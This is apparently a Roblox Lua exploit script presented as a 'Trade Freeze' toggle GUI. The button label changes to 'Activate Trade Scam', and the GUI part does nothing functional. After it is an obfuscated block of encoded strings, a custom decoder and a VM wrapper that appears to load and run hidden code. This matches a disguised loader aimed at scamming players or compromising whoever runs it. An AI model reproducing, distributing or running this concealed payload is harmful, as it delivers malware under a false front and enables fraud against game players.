-- Create GUI elements
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Button = Instance.new("TextButton")

-- Parent the GUI to the Player's ScreenGui
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Frame properties
Frame.Size = UDim2.new(0, 200, 0, 100)
Frame.Position = UDim2.new(0.5, -100, 0.5, -50)
Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Frame.BorderSizePixel = 2
Frame.Parent = ScreenGui
Frame.Active = true
Frame.Draggable = true -- Makes the frame draggable

-- Button properties
Button.Size = UDim2.new(0, 150, 0, 50)
Button.Position = UDim2.new(0.5, -75, 0.5, -25)
Button.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red when not toggled
Button.Text = "Activate Trade Freeze"
Button.TextColor3 = Color3.new(1, 1, 1) -- White text
Button.Font = Enum.Font.SourceSansBold
Button.TextSize = 16
Button.Parent = Frame

-- Toggle functionality
local toggled = false

Button.MouseButton1Click:Connect(function()
    toggled = not toggled
    if toggled then
        Button.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Green when toggled
        Button.Text = "Deactivate Trade Freeze"
    else
        Button.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red when not toggled
        Button.Text = "Activate Trade Scam"
    end
end)
return(function(...)local q={"\082\115\097\118\105\086\106\055\082\053\122\079\105\104\089\057","\115\079\107\047\070\086\102\061","\090\086\054\057\120\086\068\073";"\097\112\067\112\122\078\111\101\122\111\122\122\070\119\069\105";"\115\079\107\081\120\057\061\061";"\114\084\122\112\088\110\090\111\090\077\061\061","\105\084\122\112\088\084\066\048\075\118\107\083\120\115\065\073\088\104\068\118\105\115\072\112\088\118\054\087\088\121\089\078\070\114\107\098\082\121\107\102\070\081\065\079\105\115\052\061";"\070\104\089\050\070\052\061\061";"\115\079\107\055\082\053\122\111\100\077\061\061";"\097\115\068\111\088\053\054\069\082\086\049\061";"\082\121\107\069\070\084\068\112\088\053\111\099\070\057\061\061";"\097\104\097\098\105\121\107\080\105\057\061\061";"\066\078\077\079\066\104\097\053\068\119\052\050\070\108\068\053\066\118\112\112\068\087\083\057\075\108\103\104\076\086\066\050\068\108\052\102\070\121\052\106\070\108\097\053\066\087\069\083"}local function I(I)return q[I+7429]end for I,Q in ipairs({{1;13};{1;6},{7,13}})do while Q[1]<Q[2]do q[Q[1]],q[Q[2]],Q[1],Q[2]=q[Q[2]],q[Q[1]],Q[1]+1,Q[2]-1 end end do local I={["\051"]=15,I=43,D=13,d=30;f=56,Q=39;r=18;K=11,v=50;u=31,x=24,z=17;B=12;J=8,["\047"]=44;L=14;["\054"]=57,m=60,n=4;N=35;V=22;q=62;U=59;h=54,["\053"]=38;o=37,w=3,l=19,H=1;Y=5;C=40;P=47;["\055"]=41;e=2,E=33;j=49,["\052"]=16;F=25;p=52,["\048"]=58,O=53;G=63,S=36,["\049"]=20,["\043"]=10,i=26,M=0,R=27;["\057"]=48,W=51;t=55;y=6,["\050"]=45,["\056"]=42;c=46,b=34,g=32;A=9;k=61,X=28;Z=29,a=21;T=7,s=23}local Q=string.sub local g=string.len local Z=math.floor local B=type local e=table.concat local m=table.insert local T=q local s=string.char for q=1,#T,1 do local o=T[q]if B(o)=="\115\116\114\105\110\103"then local B=g(o)local Y={}local C=1 local t=0 local J=0 while C<=B do local q=Q(o,C,C)local g=I[q]if g then t=t+g*64^(3-J)J=J+1 if J==4 then J=0 local q=Z(t/65536)local I=Z((t%65536)/256)local Q=t%256 m(Y,s(q,I,Q))t=0 end elseif q=="\061"then m(Y,s(Z(t/65536)))if C>=B or Q(o,C+1,C+1)~="\061"then m(Y,s(Z((t%65536)/256)))end break end C=C+1 end T[q]=e(Y)end end end return(function(q,g,Z,B,e,m,T,W,Q,D,J,s,C,Y,t,o)W,s,C,Q,D,t,J,o,Y=function(q,I)local g=t(I)local Z=function(...)return Q(q,{...},I,g)end return Z end,{},0,function(Q,Z,B,e)local D,T,t,J,s,o,C,Y while Q do o=I(-7424)T=I(-7426)Q=I(-7422)C=I(-7428)D=I(-7417)J=I(-7416)Y=I(-7425)s=Z q[T]=Q T=I(-7423)q[o]=T o=q[Y]t=q[C]D=t[D]C={D(t,J)}T={}Q=q[I(-7419)]Y=o(g(C))o=Y()end Q=#e return g(T)end,function(q)o[q]=o[q]-1 if o[q]==0 then o[q],s[q]=nil,nil end end,function(q)for I=1,#q,1 do o[q[I]]=1+o[q[I]]end if Z then local Q=Z(true)local g=e(Q)g[I(-7427)],g[I(-7418)],g[I(-7421)]=q,J,function()return 473350 end return Q else return B({},{[I(-7418)]=J;[I(-7427)]=q;[I(-7421)]=function()return 473350 end})end end,function(q)local I,Q=1,q[1]while Q do o[Q],I=o[Q]-1,I+1 if o[Q]==0 then o[Q],s[Q]=nil,nil end Q=q[I]end end,{},function()C=C+1 o[C]=1 return C end return(W(16632564,{}))(g(T))end)(getfenv and getfenv()or _ENV,unpack or table[I(-7420)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
